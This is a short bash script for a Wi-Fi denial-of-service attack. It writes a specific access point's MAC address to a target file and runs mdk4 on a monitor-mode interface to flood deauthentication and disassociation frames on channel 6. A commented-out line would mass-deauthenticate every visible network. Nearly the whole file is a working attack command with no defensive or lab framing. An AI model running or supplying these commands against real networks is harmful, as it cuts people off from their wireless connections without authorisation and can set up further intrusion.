#!/bin/bash
# Target specific AP
echo "14:8C:4A:B4:F4:8C" > target.txt

# Deauth with both deauth AND disassociation frames
sudo mdk4 wlan0mon d -b target.txt -c 6

# Mass deauth all visible networks (DESTRUCTIVE!) — disabled by default
# sudo mdk4 wlan0mon d
